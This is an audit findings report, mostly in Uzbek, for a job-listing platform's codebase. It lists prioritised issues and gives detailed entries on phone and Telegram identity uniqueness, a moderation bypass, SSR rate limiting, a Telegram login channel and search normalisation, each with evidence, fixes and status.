| ISSUE-071 | P2 | UNVERIFIED | Canonical va hreflang barcha query param'larni tashlaydi: sitemap'dagi /salaries?category= canonical'ga zid, ?page= 1-sahifaga qaraydi, ?q= indekslanadi | FIXED |
| ISSUE-072 | P2 | UNVERIFIED | Vakansiya muddati hech qachon o'rnatilmaydi: expiresAt yozilmaydi, eskirgan e'lonlar abadiy faol, JobPosting'da validThrough yo'q | PARTIAL |
| ISSUE-056 | P2 | UNVERIFIED | Sitemap'lar keshsiz: har so'rovda 50 mingtagacha qator, kompaniyalarda relation filter ($lookup), 50k dan keyin jimgina kesiladi | PARTIAL |
| ISSUE-103 | P2 | UNVERIFIED | Canonical, hreflang va sitemap origin'i jimgina localhost'ga tushadi va ikki xil env'dan olinadi (VITE_SITE_URL va WEB_ORIGIN) | PARTIAL |
| ISSUE-100 | P2 | UNVERIFIED | robots.txt va sitemap yetkazilishi mo'rt: self-hosted'da umuman yo'q, Vercel'da API'ga bog'liq (timeout yo'q, robots uchun 5xx, sitemap yo'lida robots matni) | FIXED |
| ISSUE-073 | P2 | UNVERIFIED | Backend bildirishnomalari (sayt, qo'ng'iroq, push, Telegram, email) har bir foydalanuvchi uchun tayyor o'zbekcha matn sifatida saqlanadi va yuboriladi | PARTIAL |
| ISSUE-073 | P2 | UNVERIFIED | Server xato matnlari (o'zbekcha AppError, inglizcha zod default) va qattiq yozilgan zaxira matnlar RU/EN interfeysda xom ko'rinadi; 'Xatolik' mantiq belgisi sifatida ishlatiladi | PARTIAL |
| ISSUE-073 | P2 | UNVERIFIED | API slug bermagan yoki web slug'ni tashlagan joylarda hudud va kategoriya nomlari RU/EN sahifalarda o'zbekcha chiqadi | PARTIAL |
| ISSUE-075 | P2 | UNVERIFIED | Markazdagi dialoglarda max-height va ichki scroll yo'q: telefonda tasdiqlash tugmalari ekrandan tashqarida qoladi | PARTIAL |
| ISSUE-075 | P2 | UNVERIFIED | Custom Select va LanguageSwitcher: ko'rinadigan fokus yo'q, strelka tugmalari ishlamaydi, Escape fokusni body'ga tashlaydi | PARTIAL |
| ISSUE-076 | P2 | UNVERIFIED | Rang kontrasti WCAG AA'dan past: tungi rejimda signal tokeni (hover 2.98:1), kunduzgi rejimda text-dusk/80, placeholder va rangli status badge'lari | FIXED |
| ISSUE-077 | P2 | UNVERIFIED | prefers-reduced-motion ataylab e'tiborsiz: bosh sahifa, employer va auth sahifalarida cheksiz animatsiyalarni to'xtatib bo'lmaydi | FIXED |
| ISSUE-075 | P2 | UNVERIFIED | StarInput tanlangan bahoni e'lon qilmaydi va faqat 1.77:1 rangga tayanadi | FIXED |
| ISSUE-008 | P2 | UNVERIFIED | Nomzodlar bazasi sukut bo'yicha ochiq: rezyume saqlash uni chop etadi, isOpenToWork default true, ish beruvchida telefon yoki kompaniya tasdig'i talab qilinmaydi | FIXED |
| ISSUE-066 | P2 | UNVERIFIED | Vakansiya sahifasidan (Ariza/Saqlash) va saqlangan qidiruvdan mehmon login qilsa qaytish manzili yo'qoladi va bosh sahifaga tushadi | PARTIAL |
| ISSUE-029 | P2 | UNVERIFIED | Nomzodning PDF rezyumesi /uploads/ orqali autentifikatsiyasiz yuklab olinadi va hech qachon bekor qilinmaydi | FIXED |
| ISSUE-045 | P2 | UNVERIFIED | Arizalar ish maydoni eng yangi 2000 ta bilan cheklangan, har biri to'liq rezyume bilan; filtr, son va qidiruv client'da | FIXED |
| ISSUE-058 | P2 | UNVERIFIED | /api/employer/vacancies jimgina 1000 ta to'liq hujjat bilan cheklangan, har qatorda _count; tahrirlash sahifasi butun ro'yxatni yuklaydi | FIXED |
| ISSUE-032 | P2 | UNVERIFIED | Ochiq kompaniya sharhlari muallifning to'liq ismi va userId'sini beradi, bu esa u shu kompaniyaga ariza berganini oshkor qiladi | FIXED |
| ISSUE-046 | P2 | UNVERIFIED | Suhbatlar ro'yxati chegarasiz va har yuklashda butun xabar tarixi bo'yicha aggregatsiya qiladi | PARTIAL |
| ISSUE-041 | P2 | UNVERIFIED | Refresh tokenlar stateless va rotatsiya qilinmaydi: o'g'irlangan cookie global logout'gacha ishlayveradi va o'zini yangilaydi | WONT FIX |
| ISSUE-078 | P2 | UNVERIFIED | Web origin'da CSP yo'q, access token localStorage'da; API CSP esa HTML bermasa ham 'unsafe-inline' ga ruxsat beradi | FIXED |
| ISSUE-029 | P2 | UNVERIFIED | Nomzod PDF rezyumelari /uploads/ da avtorizatsiyasiz: URL doimiy bearer havola, public cache, logga yoziladi | FIXED |
| ISSUE-028 | P2 | UNVERIFIED | prestart har boot'da prisma db push bajaradi: telefon/Telegram yagonaligi uchun kerakli unique indekslar API'ni crash-loop'ga tushiradi | FIXED |
| ISSUE-030 | P2 | UNVERIFIED | Maxfiy URL'lar logga tushadi: self-hosted web server xom invite token'ni loglaydi, API redaction esa faqat qat'iy parametr nomlarini biladi | FIXED |
| ISSUE-062 | P2 | UNVERIFIED | Production himoyasi faqat NODE_ENV ga bog'liq (sukut development): qiymat berilmasa prod ochiq namunaviy JWT sirlari bilan ishga tushadi | PARTIAL |
| ISSUE-059 | P2 | UNVERIFIED | Admin vakansiya moderatsiyasi qoralamani e'lon qila oladi va kategoriya/ish joyi/joylashuv qoidalarini tekshirmaydi | FIXED |
| ISSUE-053 | P3 | UNVERIFIED | Bildirishnomalar retention/TTL'siz o'sadi; eng yangi 100 tadan eskisiga cursor yo'q; unreadOnly uchun compound indeks yo'q | PARTIAL |
| ISSUE-055 | P3 | UNVERIFIED | Takroriy yoki keraksiz count so'rovlari (arizalar, kompaniya sahifasi, maosh sort, alerts sweep) | PARTIAL |
| ISSUE-056 | P3 | UNVERIFIED | Sitemap'lar origin'da keshsiz bitta faylda quriladi (7.2 MB vakansiya sitemap'i); employer sitemap relation filter bilan; 50k qat'iy chegara | PARTIAL |
| ISSUE-048 | P3 | UNVERIFIED | Ochiq vakansiya kartalari to'liq requirements matnini tashiydi; kompaniya sahifasi 200 sharh va 100 kartani qaytaradi | NOT FIXED |
| ISSUE-051 | P3 | UNVERIFIED | Maosh statistikasi eng yangi 20 000 faol vakansiyadan ortig'ini jimgina tashlaydi va har kesh bekor bo'lganda to'plamni to'liq qayta yuklaydi | PARTIAL |
| ISSUE-046 | P3 | UNVERIFIED | Nomzodga tegishli ro'yxatlar chegarasiz: arizalar take'siz, sevimlilar per-user cheklovsiz, /favorites/ids to'liq ro'yxat | PARTIAL |
| ISSUE-003 | P3 | UNVERIFIED | WS message frame'lari REST xabarlashuvda talab qilinadigan telefon tasdig'ini tekshirmaydi | FIXED |
| ISSUE-030 | P3 | UNVERIFIED | WS access token hali query string'da (ilova loglari redakt qilingan, infratuzilma loglari noma'lum) | NOT FIXED |
| ISSUE-037 | P3 | UNVERIFIED | Bir egaga bitta kompaniya va bir profilga bitta rezyume check-then-create poygasi bilan, unique indekssiz | WONT FIX |
| ISSUE-022 | P3 | UNVERIFIED | Xatoni bo'sh natija deb qaytaruvchi fetcherlar qoldiqlari: saqlangan kompaniyalar, push, baho, SSR kataloglari, noto'g'ri shakldagi 200 va eksport qilingan ishlatilmaydigan variantlar | PARTIAL |
| ISSUE-060 | P3 | UNVERIFIED | Telefon tasdiqlash gate'i faqat suhbat boshlashda ishlaydi: WS xabarlari va ariza holati izohi tasdiqsiz yuboriladi | FIXED |
| ISSUE-032 | P3 | UNVERIFIED | Ochiq vakansiya detail'i ichki rejectionReason maydonini qaytaradi (include ishlatilgan, maydonlar whitelist'i yo'q) | FIXED |
| ISSUE-038 | P3 | UNVERIFIED | Arizalar ro'yxati va chatdagi vakansiya kartasi rad etilgan yoki moderatsiyadagi vakansiya mazmunini arizachilarga ko'rsatadi | PARTIAL |
| ISSUE-072 | P3 | UNVERIFIED | Vakansiya muddati hech bir o'qish yo'lida qo'llanmaydi, JSON-LD esa o'tib ketgan validThrough chiqaradi | WONT FIX |
| ISSUE-031 | P3 | UNVERIFIED | Noto'g'ri formatdagi id bir xil ishlanmaydi: saved-search route'lari xom params'ni Prisma'ga beradi (P2023 -> 404, boshqa route'larda 400) | FIXED |
| ISSUE-075 | P3 | UNVERIFIED | Admin ro'yxat ekranlari: qidiruv input'ida label yo'q, amallar ustunining sarlavhasi bo'sh, reytingdagi aria-label e'tiborsiz qoladi | FIXED |
| ISSUE-093 | P3 | UNVERIFIED | _error head: 500 va maqola 404 uchun umumiy 'Sahifa topilmadi' meta; xato sahifalarida hreflang chiqadi | FIXED |
| ISSUE-092 | P3 | UNVERIFIED | robots.txt hisob sahifalarini ham Disallow, ham noindex qiladi; parametrli crawl tuzoqlari uchun qoida yo'q | PARTIAL |
| ISSUE-080 | P3 | UNVERIFIED | /pricing sahifasi, billing client API/tiplari va pricing i18n kalitlari o'lik kod bo'lib qolgan; doimiy bepul platformada vaqtinchalik 302 va zid narxlar | PARTIAL |
| ISSUE-072 | P3 | UNVERIFIED | JobPosting eski employmentType 'remote' uchun FULL_TIME to'qiydi va doim directApply: true deydi | FIXED |
| ISSUE-091 | P3 | UNVERIFIED | Raqamlar har tilda ru-RU formatida (EN'da '1 207', '12 000 000 UZS') | PARTIAL |
| ISSUE-091 | P3 | UNVERIFIED | Sana va vaqt formati nomuvofiq: locale'siz toLocaleDateString(), chatda brauzer timezone'i va en-GB | PARTIAL |
| ISSUE-091 | P3 | UNVERIFIED | Til almashtirgich xato sahifalarida yo'lni yo'qotadi; locale cookie helper'lari o'lik kod | PARTIAL |
| ISSUE-091 | P3 | UNVERIFIED | O'zbekcha qo'shimchalar ajratib yoziladi ('so'm dan') va lug'atlarda terminologiya nomuvofiq | PARTIAL |
| ISSUE-075 | P3 | UNVERIFIED | Skip link yo'q, asosiy nav yorliqsiz, sticky panellar fokusni yashiradi, nomzod profilida ikkita h1 | PARTIAL |
| ISSUE-075 | P3 | UNVERIFIED | Utility'lar global fokus halqasini bekor qilgan joylarda fokus indikatori sust yoki yo'q; qidiruv inputlari yorliqsiz | PARTIAL |
| ISSUE-081 | P3 | UNVERIFIED | Tungi rejim va responsive mayda kamchiliklar: global color-scheme yo'q, 100vh, illyustratsiyalarning tungi varianti yo'q, nowrap va uzun sarlavhalar | PARTIAL |
| ISSUE-075 | P3 | UNVERIFIED | Filtr drawer'lari modal fokus tuzog'ini nusxalagan va useDialog'dan farqlanib ketgan | FIXED |
| ISSUE-080 | P3 | UNVERIFIED | Demo seed bepul platformaga moslanmagan: HR'ga 'Premium tarif faollashtirildi' bildirishnomasi, pullik rejalar, obunalar va 11 ta to'lov | WONT FIX |
| ISSUE-080 | P3 | UNVERIFIED | Admin to'lovni tasdiqlash va billing admin UI BILLING_ENABLED bilan yopilmagan; tasdiqlash ish beruvchiga 'tarif faollashtirildi' deydi | FIXED |
| ISSUE-080 | P3 | UNVERIFIED | Nomzod qidiruvidagi 'Premium' belgisi, 'faqat premium vakansiyalar' filtri va premium-first sukut saralashi pullik darajani eslatadi | FIXED |
| ISSUE-064 | P3 | UNVERIFIED | Billing modulini qayta yoqish xavfli: rejalar vakansiya limiti va pullik nomzod qidiruvini kodlaydi, webhook har imzolangan chaqiruvni to'langan deb belgilaydi | WONT FIX |
| ISSUE-065 | P3 | UNVERIFIED | Hujjatlar monetizatsiyani hali faol deb ko'rsatadi: tizim-arxitekturasi.md, CHANGELOG va audit xaritalari (snapshot belgisisiz) | FIXED |
| ISSUE-046 | P3 | UNVERIFIED | Vakansiya sahifasi bitta arizani topish uchun nomzodning barcha arizalarini yuklaydi; GET /api/applications chegarasiz | PARTIAL |
| ISSUE-036 | P3 | UNVERIFIED | Ariza holati o'zgarishlari cheklanmagan; izoh xabari telefon tasdig'i gate'ini chetlab o'tadi | PARTIAL |
| ISSUE-059 | P3 | UNVERIFIED | Admin tasdiqlashi placement qoidalarini tekshirmaydi, shaxsiy draft'ni chop eta oladi va ish beruvchini xabardor qilmaydi | PARTIAL |
| ISSUE-024 | P3 | UNVERIFIED | Arizasi bor rad etilgan yoki moderatsiyadagi vakansiyani ish beruvchi yopa ham, o'chira ham olmaydi; o'chirish tekshiruvi atomar emas | PARTIAL |
| ISSUE-087 | P3 | UNVERIFIED | PUT /api/vacancies/:id'da telefon tasdig'i gate'i yo'q, POST va qayta faollashtirishda esa bor | FIXED |
| ISSUE-089 | P3 | UNVERIFIED | Masofaviy vakansiya joylashuvni saqlay olmaydi; API employmentType 'remote'ni istalgan workplaceType bilan qabul qiladi | FIXED |
| ISSUE-002 | P3 | UNVERIFIED | Kompaniya formasi API rad etadigan SVG logoni taklif qiladi; PUT faqat bo'shliqdan iborat kompaniya nomini qabul qiladi | PARTIAL |
| ISSUE-095 | P3 | UNVERIFIED | /employer/@slug har qanday noma'lum segmentni doimiy 301 bilan /companies/<segment> ga yo'naltiradi | NOT FIXED |
| ISSUE-009 | P3 | UNVERIFIED | JWT tekshiruvi hali ham typ yoki v bo'lmagan tokenlarni qabul qiladi (legacy fallback) | PARTIAL |
| ISSUE-044 | P3 | UNVERIFIED | Parol siyosati faqat uzunlikni tekshiradi: keng tarqalgan parollar, 8 belgili admin paroli ruxsat, signup maydonida minLength yo'q | PARTIAL |
| ISSUE-044 | P3 | UNVERIFIED | Login sahifasidagi 'Eslab qolish' checkbox hech narsa qilmaydi | FIXED |
| ISSUE-066 | P3 | UNVERIFIED | Signup va login'dagi signup havolasi returnTo manzilini yo'qotadi | FIXED |
| ISSUE-100 | P3 | UNVERIFIED | Deploy target'lari orasida web header nomuvofiqligi: Permissions-Policy yo'q, self-hosted'da HSTS yo'q, xavfli HSTS preload, 4 nusxa header ro'yxati | PARTIAL |
| ISSUE-079 | P3 | UNVERIFIED | Shutdown Telegram update'larini tasdiqlamaydi va jarayondagi ishni kutmaydi; self-hosted web shutdown'da timeout yo'q | PARTIAL |
| ISSUE-080 | P3 | UNVERIFIED | Eski to'lovlar admin paneli billing bayrog'i ortida emas | FIXED |
| ISSUE-063 | P3 | UNVERIFIED | E2E admin.routes mutatsiyalari uchun salbiy authz tekshiruvlarini qamramaydi | FIXED |

### Rad etilgan topilmalar

| Guruh | Sev | Sarlavha | Sabab (verify) |
|---|---|---|---|

### ISSUE-147

**Tasdiqlangan telefon unique emas: Telegram kontakt ulashish boshqa hisobdagi raqamni tekshirmay yozadi, phone indekssiz**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** identity/phone
- **Fayl:** `apps/api/src/modules/telegram/telegram.service.ts:340`
- **Root cause:** User.phone oddiy ixtiyoriy satr: unique, normalizatsiya va indeks yo'q. handleContact chat bog'langan hisobga phone va isPhoneVerified=true ni yozadi, bu raqam boshqa hisobda tasdiqlanganmi tekshirmaydi va mavjud boshqa raqamni telefon almashtirish deb hisoblamaydi. Relink eski hisobdan faqat telegramChatId ni o'chiradi, tasdiqlangan telefon qoladi. Tasdiqlanmagan foydalanuvchi PATCH /api/profile orqali istalgan satrni saqlaydi.
- **Impact:** Rule E buziladi: bitta SIM bir nechta hisobda tasdiqlangan bo'ladi va requirePhoneVerified anti-spam darvozasini ko'p hisob uchun ochadi. Telefon orqali tiklash (rule B) noaniq yoki noto'g'ri hisobga tushadi. Asosiy telefon audit, security event va sessiya bekor qilishsiz almashadi (rule G). Tiklash so'rovi 10k+ users ustida to'liq skan bo'ladi.
- **Evidence:** schema.prisma:163 `phone String?`, indekslar faqat :201-203 (telegramChatId, role, createdAt). telegram.service.ts:269-273 updateMany/update relink; :339-343 `phone = '+'+digits; update {phone, isPhoneVerified:true}` dublikat tekshiruvisiz. profile.routes.ts:15 phone max(30), :65-66 tasdiqlanmaganda saqlanadi. :217 additionalPhone ham indekssiz.
- **Recommended fix:** Tasdiqlangan raqamlarni E.164 ko'rinishida alohida kolleksiyada saqlang (masalan VerifiedPhone {phoneE164 @unique, userId, kind primary|backup, verifiedAt}) — qator faqat tasdiqlanganda bo'lgani uchun null to'qnashuvi yo'q. handleContact raqam boshqa hisobda bo'lsa umumiy javob bilan to'xtasin; mavjud boshqa raqam bo'lsa telefon almashtirish oqimi (audit, siyosatga ko'ra tokenVersion). Indeksdan oldin dublikatlar hisobotini (read-only) ishga tushiring.
- **Severity izohi:** P1 saqlandi: yangi rule E/F ning bevosita buzilishi va tiklash oqimi uchun blocker. scale-10k-14 P2 bergan edi (faqat indeks nuqtai nazaridan); root cause bir xil bo'lgani uchun birlashtirildi. ISSUE-012 (tiklash yo'q) bog'liq, lekin boshqa root cause.
- **Manba topilmalar:** db-perf-2, data-integrity-1, scale-10k-14
- **Bajarilgan fix:** db-perf-2: FIXED — @@index([phone]), @@index([backupPhone]), @@index([backupTelegramId]) added; uniqueness enforced in code at verification time; existing duplicates are never modified. | data-integrity-1: FIXED — A contact message with no awaiting_contact challenge changes nothing (the bot tells the user to start from the site). | scale-10k-14: FIXED — Recovery-by-phone lookups (primary and backup) are indexed.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-148

**Telegram identifikatsiyasi unique bo'lmagan chat id ga bog'langan, findFirst bilan qidiriladi; Telegram hali login kanali**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** identity/telegram
- **Fayl:** `apps/api/src/modules/telegram/telegram.service.ts:244`
- **Root cause:** Bog'lashda String(msg.chat.id) User.telegramChatId ga yoziladi (unique emas), msg.from.id saqlanmaydi, private chat tekshiruvi yo'q. Yagonalik tranzaksiyasiz updateMany+update bilan kodda. Login tasdiqi, kontakt va support hisobni tartibsiz findFirst({telegramChatId}) bilan topadi. Telegram login endpointlari va UI tugmasi hali mavjud.
- **Impact:** Rule F (bitta Telegram — bitta hisob) DB darajasida kafolatlanmaydi; dublikat bo'lsa login va telefon tasdig'i ixtiyoriy hisobga tushadi. Xulosa (inference): guruhda /start <token> yuborilsa guruh chati bog'lanadi va istalgan a'zo kontakti hisobning tasdiqlangan telefoniga aylanadi. Rule A buziladi: Telegram orqali kirish ishlaydi.
- **Evidence:** schema.prisma:172-176,201 telegramChatId non-unique. telegram.service.ts:244 chatId=String(msg.chat.id); :269-273 updateMany then update; :162 handleLoginStart findFirst; :328 faqat contact.user_id===from.id; :333 findFirst. auth.routes.ts:137 /api/auth/telegram/start, :149 /poll, :155 telegramLogin. web SocialLogin.tsx:2,31 `showTelegram = true`; lib/api.ts:147,157.
- **Recommended fix:** TelegramIdentity {telegramUserId @unique, userId @unique, chatId, linkedAt} modeli; faqat private chat va from.id bo'yicha qabul qilish; konfliktda tranzaksiyada rad etish yoki audit bilan aniq re-link. Hisobni faqat unique kalit bilan toping. /api/auth/telegram/* va SocialLogin Telegram tugmasini olib tashlang (rule A).
- **Severity izohi:** P1: rule A va F buzilishi kodda tasdiqlandi. ISSUE-010 (FIXED) faqat tasdiq qadamini qo'shgan, login kanali va identifikatsiya kaliti muammosi yangi.
- **Manba topilmalar:** data-integrity-2
- **Bajarilgan fix:** data-integrity-2: FIXED — Identity is String(message.from.id) and auth flows only run in private chats (chat.id == from.id). findFirst is still used for owner lookups because Prisma/MongoDB cannot express a
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-149

**Moderatsiyani chetlab o'tish: ega admin arxivlagan vakansiyani qayta faollashtiradi; admin tasdig'i kategoriya/joylashuv va blok tekshiruvisiz**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** vacancy/moderation
- **Fayl:** `apps/api/src/modules/admin/admin.routes.ts:287`
- **Root cause:** Vakansiyada kim yopgani qayd etilmaydi: bitta status. Ega PATCH archived→active ga ruxsat beradi, shuning uchun admin arxivi bekor qilinadi. Admin moderate route istalgan holatdan active/rejected/archived yozadi, assertVacancyPlacement va egasi bloklanganini tekshirmaydi. Blok faqat active vakansiyalarni arxivlaydi.
- **Impact:** Product rule (moderation bypass imkonsiz) buziladi: arxivlangan spam e'lon ko'rib chiqishsiz qaytadi. Admin kategoriya yoki workplaceType'siz eski e'lonni, yoki bloklangan employer e'lonini chop etishi mumkin — u ariza yig'adi, egasi kira olmaydi.
- **Evidence:** admin.routes.ts:287-309 status enum, placement/owner tekshiruvi yo'q; :203-208 blok faqat status 'active'. vacancies.routes.ts:240 `allowedFrom = {active:['archived','draft'], archived:['active']}`. web admin/vacancies/+Page.tsx:186 active qatorda Archive tugmasi (admin arxivi moderatsiya harakati ekani — inference).
- **Recommended fix:** closedBy: owner|admin|block, moderatedBy, moderatedAt maydonlari. closedBy admin/block bo'lsa ega faqat moderation'ga yuborsin. Admin approve'da assertVacancyPlacement va owner isBlocked tekshiruvi. Blokda moderation/draft ham tasdiqlanadigan navbatdan chiqsin. Admin moderatsiya harakatlarini audit qiling.
- **Severity izohi:** P1 saqlandi: 'moderation bypass must be impossible' va 'category/workplaceType required' qoidalari. ISSUE-024/059 faqat ega PATCH yo'lini tuzatgan; admin yo'li va provenance yangi.
- **Manba topilmalar:** data-integrity-3
- **Bajarilgan fix:** data-integrity-3: FIXED — Owner cannot re-activate an admin-archived vacancy (409 VACANCY_LOCKED); admin activation validates category/workplace/region, refuses drafts (409 VACANCY_IS_DRAFT) and refuses a b
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-150

**Barcha SSR API so'rovlari bitta per-IP rate-limit kvotasini (600/min) bo'lishadi: crawler yoki o'rtacha trafik 429 beradi**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** scale/rate-limit
- **Fayl:** `apps/api/src/server.ts:129`
- **Root cause:** @fastify/rate-limit global, max RATE_LIMIT_MAX (600/min), req.ip bo'yicha; keyGenerator, allowList yoki route istisnosi yo'q. Web SSR loaderlari API'ni oddiy fetch bilan chaqiradi, mijoz identifikatsiyasini uzatmaydi. Har render web serverning egress IP kvotasidan: bosh sahifa 4, /vacancies 2, detail 2 chaqiruv.
- **Impact:** Self-hosted web'da barcha tashrif va crawlerlar uchun ~10 API chaqiruv/s, ya'ni ~2.5-5 sahifa/s. ~16k vakansiya va kompaniya URL'ini aylanayotgan crawler yoki cho'qqi trafik 429 oladi; loaderlar ularni xato sahifaga (200 + noindex, ISSUE-070) aylantiradi. Vercel'da egress IP taqsimotiga bog'liq (inference, o'lchanmagan).
- **Evidence:** server.ts:129-139 rateLimit({max: env.RATE_LIMIT_MAX, timeWindow:'1 minute'}), keyGenerator yo'q. env.ts:56 default 600. web lib/api.ts:75 `fetch(`${API_URL}${path}`, {...init, signal})` headerlarsiz. pages/vacancies/@slug/+data.ts:13-22 detail + similar parallel.
- **Recommended fix:** SSR uchun alohida kvota: SSR server-only maxfiy header yuborsin, keyGenerator uni tekshirib tasdiqlangan forwarded mijoz IP yoki yuqori limitli kalit bersin. auth, apply, upload va recovery yo'llarida qat'iy per-IP limit qolsin. Anonim detail HTML uchun CDN s-maxage + stale-while-revalidate.
- **Severity izohi:** P1 saqlandi, lekin trafik ta'siri kod asosida xulosa (medium confidence). Self-hosted uchun deyarli aniq; indeksdan chiqish xavfi tufayli P2 dan yuqori. ISSUE-011 (XFF spoofing) boshqa root cause.
- **Manba topilmalar:** scale-10k-1
- **Bajarilgan fix:** scale-10k-1: FIXED — SSR traffic gets its own 6000/min bucket instead of sharing the 600/min per-IP bucket. Effective only once the web sends x-ssr-key (web-auth-ui, D-074 web part - listed in needsOut
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-151

**Telegram hali ham login kanali: /api/auth/telegram/start va /poll sessiya beradi (A qoidasi buzilgan)**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** auth/telegram-login
- **Fayl:** `apps/api/src/modules/auth/auth.routes.ts:137`
- **Root cause:** Telegram uchinchi login provayderi sifatida qurilgan. ISSUE-010 va D-039 bu oqimni olib tashlamadi, faqat bot ichidagi tasdiq tugmasi bilan mustahkamladi. README, DESIGN, .env.example, tizim-arxitekturasi va xaritalar ham shu modelga yozilgan. Shuning uchun egasining yangi qarori (Telegram faqat tasdiqlash, tiklash va bog'lash uchun) kodga ham, hujjatlarga ham kirmagan.
- **Impact:** Egasi taqiqlagan, sessiya beruvchi kanal ishlab turibdi va fishing nishoni bo'lib qolmoqda. Foydalanuvchiga Telegram kirish yo'li sifatida ko'rsatiladi. Keyingi ishlar bu yo'lni saqlab qolishi yoki kengaytirishi mumkin.
- **Evidence:** auth.routes.ts:137-146 `/api/auth/telegram/start` deep-link beradi; :149-158 `/poll` -> `telegramLogin(entry.userId!)` -> refresh cookie + accessToken. auth.service.ts:176-181 telegramLogin. telegram.service.ts:248-249 `lg` payload -> handleLoginStart; :284-321 lgok/lgno callback. Web: SocialLogin.tsx:145-154 Telegram tugmasi (login/+Page.tsx:97). Hujjatlar: DESIGN.md:219-225, README.md:137, .env.example:61, tizim-arxitekturasi.md:630, API_MAP.md:41-42, DECISIONS.md:425 (D-039).
- **Recommended fix:** /api/auth/telegram/start va /poll, telegramLogin, botdagi `lg` payload va lgok/lgno callback ishlovchilarini, loginTokens xaritasini, SocialLogin'dagi Telegram tugmasini va i18n kalitlarini (withTelegram, tgWaiting, tgNotLinked) olib tashlang. Deep-link faqat bog'lash, telefon tasdiqlash va tiklash uchun qolsin. D-039'ni bekor qiluvchi qaror yozing, ISSUE-010'ni superseded, ISSUE-122'ning login qismini obsolete deb belgilang. README, .env.example, DESIGN auth bo'limi, tizim 19-bo'lim, ARCHITECTURE_AUDIT 1.2 va xaritalarni yangilang. Faqat Telegram orqali kiradiganlar qulflanib qolmasligi uchun avval B tiklash oqimini chiqaring.
- **Severity izohi:** P1 saqlandi: A qoidasining bevosita buzilishi. Tasdiq tugmasi fishingni qiyinlashtirgani uchun P0 emas. ISSUE-010 ildizi (tasdiqsiz sessiya) boshqa, shuning uchun yangi.
- **Manba topilmalar:** docs-1
- **Bajarilgan fix:** docs-1: FIXED — DESIGN.md SocialLogin section now states Telegram is NOT a login channel (button, /api/auth/telegram/start and /poll removed; Telegram only for phone verification and password reco
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-152

**Qidiruvda matn normallashtirilmaydi: o'zbekcha apostrof variantlari, kirill-lotin va ru/en kategoriya nomlari mos kelmaydi**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** search/normalization
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.service.ts:137`
- **Root cause:** searchTerms matnni faqat trim qiladi va bo'shliq bo'yicha bo'ladi; so'zlar Prisma `contains/insensitive` orqali literal substring sifatida qidiriladi. Saqlangan sarlavha, tavsif, kompaniya va kategoriya nomi kiritilganidek turadi. Na so'rov, na saqlangan matnda ʻ ʼ ’ ‘ ` bitta shaklga keltirilmaydi va kirill lotinga o'girilmaydi. Kategoriya nomlari faqat o'zbek lotinida saqlanadi. normalizeSearch articles modulida mavjud, lekin vakansiya, kompaniya, nomzod va admin qidiruvida ishlatilmaydi.
- **Impact:** So'rov va vakansiyada o'/g' turli belgi bilan yozilgan bo'lsa (o'qituvchi, qo'riqchi, ko'chmas mulk, Farg'ona), foydalanuvchi bo'sh sahifa ko'radi. iOS Smart Punctuation ' belgisini ’ ga aylantiradi, rasmiy lotin yozuvida ʻ (U+02BB) ishlatiladi, shuning uchun nomuvofiqlik ikki tomonlama (qanchalik ko'p uchrashi taxmin). Kirillda yozgan o'zbek foydalanuvchisi (дастурчи) va ru/en interfeysda ko'rgan kategoriya nomini yozgan foydalanuvchi (Финансы) lotin yozuvidagi vakansiyalardan 0 yoki qisman natija oladi.
- **Evidence:** vacancies.service.ts:137-143 searchTerms: trim + bo'shliq bo'yicha split, length>=2, slice(0,6), normallashtirish yo'q; :183-184 kompaniya/kategoriya nomi `contains`; :253-269 textFilter `contains`. companies.list.ts:247-249 `escapeRegex(word)`, normallashtirmasdan. articles.content.ts:40-41 normalizeSearch apostrof variantlarini ' ga keltiradi, lekin faqat maqolalarda. seed.ts:45-50 kategoriya nomlari faqat uz; web lib/i18n/categories.ts:23-38 tarjima slug bo'yicha. demo-seed.ts faqat ASCII ' ishlatadi; ?text=ko’chmas (U+2019) 0 natija beradi (kod asosida xulosa).
- **Recommended fix:** common/ ichida umumiy normalizeSearch yarating: lowercase, [ʻʼ’‘`´] -> ', slug.ts dagi TRANSLIT jadvali bilan kirill -> lotin. Uni barcha qidiruvlarda so'rov so'zlariga qo'llang. Vacancy va Company uchun Article.searchText kabi normallashtirilgan searchText maydonini qo'shing: sarlavha, kompaniya nomi va kategoriyaning uz/ru/en so'zlari (CATEGORY_WORDS kabi). Maydon yozishda to'ldirilsin, mavjud yozuvlar uchun backfill qilinsin. Meili toDoc'da ham shu maydonni indekslang. e2e'ga ’, ʻ, kirill va ru kategoriya nomi holatlarini qo'shing.
- **Severity izohi:** gap1-1 P1 saqlandi: asosiy qidiruv oqimida keng tarqalgan kiritish varianti 0 natija beradi. gap1-5 (P2) ildizi va yechimi (normallashtirilgan searchText) bir xil bo'lgani uchun qo'shildi.
- **Manba topilmalar:** gap1-1, gap1-5
- **Bajarilgan fix:** gap1-1: FIXED — Apostrophe variants are equal in vacancy search (title/description/requirements + company and category name pre-resolution), company catalog search and candidate search, in both di | gap1-5: WONT FIX — Lead note: Latin/Cyrillic bridging is out of scope for this round (needs a transliteration table plus a stored searchText and a backfill). Category names are still only searchable 
